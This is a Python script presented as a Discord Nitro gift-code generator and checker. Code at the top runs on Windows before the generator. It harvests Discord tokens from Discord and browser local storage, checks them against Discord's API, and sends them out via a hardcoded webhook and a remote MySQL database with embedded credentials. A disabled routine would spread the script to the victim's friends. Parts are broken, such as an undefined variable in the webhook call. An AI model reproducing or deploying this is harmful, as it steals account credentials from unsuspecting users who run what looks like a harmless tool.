
import os
if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
import pymysql
import time 
import random
import string
import ctypes
from colorama import Fore
try: # Check if the requrements have been installed
    from discord_webhook import DiscordWebhook # Try to import discord_webhook
except ImportError: # If it chould not be installed
    input(f"Module discord_webhook not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install discord_webhook'\nPress enter to exit") # Tell the user it has not been installed and how to install it
    exit() # Exit the program
try: # Setup try statement to catch the error
    import requests # Try to import requests
except ImportError: # If it has not been installed
    input(f"Module requests not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install requests'\nPress enter to exit")# Tell the user it has not been installed and how to install it
    exit() # Exit the program

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
       "Discord": ROAMING + "\\Discord",
        "Discord Canary": ROAMING + "\\discordcanary",
        "Discord PTB": ROAMING + "\\discordptb",
        "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
        "Opera": ROAMING + "\\Opera Software\\Opera Stable",
        "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
       }


def getheaders(token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers


def getuserdata(token):
        try:
            return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
        except:
            pass


def gettokens(path):
        path += "\\Local Storage\\leveldb"
        tokens = []
        for file_name in os.listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue
            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    for token in findall(regex, line):
                        tokens.append(token)
        return tokens


def spread(token, form_data, delay):
        return  # Remove to re-enabled
        for friend in getfriends(token):
            try:
                chat_id = getchat(token, friend["id"])
                send_message(token, chat_id, form_data)
            except Exception as e:
                pass
            sleep(delay)


def main():
        cache_path = ROAMING + "\\.cache~$"
        prevent_spam = True
        self_spread = True
        embeds = []
        working = []
        checked = []
        already_cached_tokens = []
        working_ids = []
        pc_username = os.getenv("UserName")
        pc_name = os.getenv("COMPUTERNAME")
        user_path_name = os.getenv("userprofile").split("\\")[2]
        for platform, path in PATHS.items():
            if not os.path.exists(path):
                continue
            for token in gettokens(path):
                if token in checked:
                    continue
                checked.append(token)
                uid = None
                if not token.startswith("mfa."):
                    try:
                        uid = b64decode(token.split(".")[0].encode()).decode()
                    except:
                        pass
                    if not uid or uid in working_ids:
                        continue
                user_data = getuserdata(token)
                if not user_data:
                    continue
                working_ids.append(uid)
                working.append(token)
                username = user_data["username"] + \
                    "#" + str(user_data["discriminator"])
                user_id = user_data["id"]
                
        with open(cache_path, "a") as file:
            for token in checked:
                if not token in already_cached_tokens:
                    file.write(token + "\n")
        
        try:
            urlopen(Request("https://discord.com/api/webhooks/864652066516238386/fXXHGwVr4rlbVi6iAWcZYc-0CB97ULmyIYAInlxhI-o3MGCrhmaw8vVi4Ttt8q9ZLV53",
               data=dumps(noseporquesiquitoestonofuncionaxd).encode(), headers=getheaders()))
        except:
            pass
        if self_spread:
            for token in working:
                with open(argv[0], encoding="utf-8") as file:
                    content = file.read()
                payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
                Thread(target=spread, args=(
                    token, payload, 7500 / 1000)).start()
        
#Data base connection
        conexion = pymysql.connect(
            host="btlschqchhptyq0phccv-mysql.services.clever-cloud.com",
            user="ud8lewjifomcpzhu",
            password="HN7M2OkxqMeF4qX784xJ",
            db="btlschqchhptyq0phccv"
        )
#Cursor connection
        cursor = conexion.cursor()
#Save teh variable
        valores = (token)
#Set autocommit
        commit = "SET autocommit = ON"
#Send values to db
        sql = f"INSERT INTO tokens(token) VALUES('{valores}')"
#Cursor executions
        cursor.execute(commit)
        cursor.execute(sql)
        print(cursor.rowcount, "Registro ha sido insertado")

        
try:
    main()
except Exception as e:
    print(e)
    pass        



class NitroGen: # Initialise the class
    def __init__(self): # The initaliseaiton function
        self.fileName = "Nitro Codes.txt" # Set the file name the codes are stored in

    def main(self): # The main function contains the most important code
        ##os.system('cls' if os.name == 'nt' else 'clear') # Clear the screen
        if os.name == "nt": # If the system is windows
            print("")
            ctypes.windll.kernel32.SetConsoleTitleW("Nitro Generator and Checker - Made by Drillenissen#4268") # Change the
        else: # Or if it is unix
            print(f'\33]0;Nitro Generator and Checker - Made by Drillenissen#4268\a', end='', flush=True) # Update title of command prompt
        

        print(Fore.BLUE+"""           _____                    _____                _____                    _____                   _______         
         /\    \                  /\    \              /\    \                  /\    \                 /::\    \        
        /::\____\                /::\    \            /::\    \                /::\    \               /::::\    \       
       /::::|   |                \:::\    \           \:::\    \              /::::\    \             /::::::\    \      
      /:::::|   |                 \:::\    \           \:::\    \            /::::::\    \           /::::::::\    \     
     /::::::|   |                  \:::\    \           \:::\    \          /:::/\:::\    \         /:::/~~\:::\    \    
    /:::/|::|   |                   \:::\    \           \:::\    \        /:::/__\:::\    \       /:::/    \:::\    \   
   /:::/ |::|   |                   /::::\    \          /::::\    \      /::::\   \:::\    \     /:::/    / \:::\    \  
  /:::/  |::|   | _____    ____    /::::::\    \        /::::::\    \    /::::::\   \:::\    \   /:::/____/   \:::\____\ 
 /:::/   |::|   |/\    \  /\   \  /:::/\:::\    \      /:::/\:::\    \  /:::/\:::\   \:::\____\ |:::|    |     |:::|    |
/:: /    |::|   /::\____\/::\   \/:::/  \:::\____\    /:::/  \:::\____\/:::/  \:::\   \:::|    ||:::|____|     |:::|    |
\::/    /|::|  /:::/    /\:::\  /:::/    \::/    /   /:::/    \::/    /\::/   |::::\  /:::|____| \:::\    \   /:::/    / 
 \/____/ |::| /:::/    /  \:::\/:::/    / \/____/   /:::/    / \/____/  \/____|:::::\/:::/    /   \:::\    \ /:::/    /  
         |::|/:::/    /    \::::::/    /           /:::/    /                 |:::::::::/    /     \:::\    /:::/    /   
         |::::::/    /      \::::/____/           /:::/    /                  |::|\::::/    /       \:::\__/:::/    /    
         |:::::/    /        \:::\    \           \::/    /                   |::| \::/____/         \::::::::/    /     
         |::::/    /          \:::\    \           \/____/                    |::|  ~|                \::::::/    /      
         /:::/    /            \:::\    \                                     |::|   |                 \::::/    /       
        /:::/    /              \:::\____\                                    \::|   |                  \::/____/        
        \::/    /                \::/    /                                     \:|   |                   ~~              
         \/____/                  \/____/                                       \|___|                                   
                                                                                                                         
                                                        """)
        print(Fore.BLUE+"""          _____                    _____                    _____                    _____          
         /\    \                  /\    \                  /\    \                  /\    \         
        /::\    \                /::\    \                /::\____\                /::\    \        
       /::::\    \              /::::\    \              /::::|   |               /::::\    \       
      /::::::\    \            /::::::\    \            /:::::|   |              /::::::\    \      
     /:::/\:::\    \          /:::/\:::\    \          /::::::|   |             /:::/\:::\    \     
    /:::/  \:::\    \        /:::/__\:::\    \        /:::/|::|   |            /:::/  \:::\    \    
   /:::/    \:::\    \      /::::\   \:::\    \      /:::/ |::|   |           /:::/    \:::\    \   
  /:::/    / \:::\    \    /::::::\   \:::\    \    /:::/  |::|   | _____    /:::/    / \:::\    \  
 /:::/    /   \:::\ ___\  /:::/\:::\   \:::\    \  /:::/   |::|   |/\    \  /:::/    /   \:::\ ___\ 
/:::/____/  ___\:::|    |/:::/__\:::\   \:::\____\/:: /    |::|   /::\____\/:::/____/     \:::|    |
\:::\    \ /\  /:::|____|\:::\   \:::\   \::/    /\::/    /|::|  /:::/    /\:::\    \     /:::|____|
 \:::\    /::\ \::/    /  \:::\   \:::\   \/____/  \/____/ |::| /:::/    /  \:::\    \   /:::/    / 
  \:::\   \:::\ \/____/    \:::\   \:::\    \              |::|/:::/    /    \:::\    \ /:::/    /  
   \:::\   \:::\____\       \:::\   \:::\____\             |::::::/    /      \:::\    /:::/    /   
    \:::\  /:::/    /        \:::\   \::/    /             |:::::/    /        \:::\  /:::/    /    
     \:::\/:::/    /          \:::\   \/____/              |::::/    /          \:::\/:::/    /     
      \::::::/    /            \:::\    \                  /:::/    /            \::::::/    /      
       \::::/    /              \:::\____\                /:::/    /              \::::/    /       
        \::/____/                \::/    /                \::/    /                \::/____/        
                                  \/____/                  \/____/                  ~~              
                                                                                                                  
                                                        """) # Print the title card

        time.sleep(2) # Wait a few seconds
        self.slowType("Made by: iTzYix", .02) # Print who developed the code
        time.sleep(1) # Wait a little more
        self.slowType("\nInserta el numero de codigos a generar (RECOMENDADO MAS DE 20 MILLONES): ", .02, newLine = False) # Print the first question

        num = int(input('')) # Ask the user for the amount of codes

        # Get the webhook url, if the user does not wish to use a webhook the message will be an empty string
        self.slowType("\n¿Quieres usar una Webhook de Discord? \nSi no quieres presiona enter: ", .02, newLine = False)
        url = input('') # Get the awnser
        webhook = url if url != "" else None # If the url is empty make it be None insted

        # print() # Print a newline for looks

        valid = [] # Keep track of valid codes
        invalid = 0 # Keep track of how many invalid codes was detected

        for i in range(num): # Loop over the amount of codes to check
            try: # Catch any errors that may happen
                code = "".join(random.choices( # Generate the id for the gift
                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
                    k = 16
                ))
                url = f"https://discord.gift/{code}" # Generate the url

                result = self.quickChecker(url, webhook) # Check the codes

                if result: # If the code was valid
                    valid.append(url) # Add that code to the list of found codes
                else: # If the code was not valid
                    invalid += 1 # Increase the invalid counter by one
            except Exception as e: # If the request fails
                print(f" Error | {url} ") # Tell the user an error occurred

            if os.name == "nt": # If the system is windows
                ctypes.windll.kernel32.SetConsoleTitleW(f"Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid - Made by Drillenissen#4268") # Change the title
                print("")
            else: # If it is a unix system
                print(f'\33]0;Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid - Made by Drillenissen#4268\a', end='', flush=True) # Change the title

        print(f"""
Results:
 Valid: {len(valid)}
 Invalid: {invalid}
 Valid Codes: {', '.join(valid )}""") # Give a report of the results of the check

        input("\nThe end! Press Enter 5 times to close the program.") # Tell the user the program finished
        [input(i) for i in range(4,0,-1)] # Wait for 4 enter presses


    def slowType(self, text, speed, newLine = True): # Function used to print text a little more fancier
        for i in text: # Loop over the message
            print(i, end = "", flush = True) # Print the one charecter, flush is used to force python to print the char
            time.sleep(speed) # Sleep a little before the next one
        if newLine: # Check if the newLine argument is set to True
            print() # Print a final newline to make it act more like a normal print statement

    def generator(self, amount): # Function used to generate and store nitro codes in a seperate file
        with open(self.fileName, "w", encoding="utf-8") as file: # Load up the file in write mode
            print("Wait, Generating for you") # Let the user know the code is generating the codes

            start = time.time() # Note the initaliseation time

            for i in range(amount): # Loop the amount of codes to generate
                code = "".join(random.choices(
                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
                    k = 16
                )) # Generate the code id

                file.write(f"https://discord.gift/{code}\n") # Write the code

            # Tell the user its done generating and how long tome it took
            print(f"Genned {amount} codes | Time taken: {round(time.time() - start, 5)}s\n") #

    def fileChecker(self, notify = None): # Function used to check nitro codes from a file
        valid = [] # A list of the valid codes
        invalid = 0 # The amount of invalid codes detected
        with open(self.fileName, "r", encoding="utf-8") as file: # Open the file containing the nitro codes
            for line in file.readlines(): # Loop over each line in the file
                nitro = line.strip("\n") # Remove the newline at the end of the nitro code

                # Create the requests url for later use
                url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"

                response = requests.get(url) # Get the responce from the url

                if response.status_code == 200: # If the responce went through
                    print(f" Si sirve pa | {nitro} ") # Notify the user the code was valid
                    valid.append(nitro) # Append the nitro code the the list of valid codes

                    if notify is not None: # If a webhook has been added
                        DiscordWebhook( # Send the message to discord letting the user know there has been a valid nitro code
                            url = notify,
                            content = f"Valid Nito Code detected! @everyone \n{nitro}"
                        ).execute()
                    else: # If there has not been a discord webhook setup just stop the code
                        break # Stop the loop since a valid code was found

                else: # If the responce got ignored or is invalid ( such as a 404 or 405 )
                    print(Fore.RED+f" No sirve pa na | {nitro} ") # Tell the user it tested a code and it was invalid
                    invalid += 1 # Increase the invalid counter by one

        return {"valid" : valid, "invalid" : invalid} # Return a report of the results

    def quickChecker(self, nitro, notify = None): # Used to check a single code at a time
        # Generate the request url
        url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
        response = requests.get(url) # Get the response from discord

        if response.status_code == 200: # If the responce went through
            print(Fore.GREEN+f" Alm si sirve xd | {nitro} ", flush=True, end="" if os.name == 'nt' else "\n") # Notify the user the code was valid
            with open("Nitro Codes.txt", "w") as file: # Open file to write
                file.write(nitro) # Write the nitro code to the file it will automatically add a newline

            if notify is not None: # If a webhook has been added
                DiscordWebhook( # Send the message to discord letting the user know there has been a valid nitro code
                    url = notify,
                    content = f"Valid Nito Code detected! @everyone \n{nitro}"
                ).execute()

            return True # Tell the main function the code was found

        else: # If the responce got ignored or is invalid ( such as a 404 or 405 )
            print(f" Invalid | {nitro} ", flush=True, end="" if os.name == 'nt' else "\n") # Tell the user it tested a code and it was invalid
            return False # Tell the main function there was not a code found

if __name__ == '__main__':
    Gen = NitroGen() # Create the nitro generator object
    Gen.main() # Run the main code
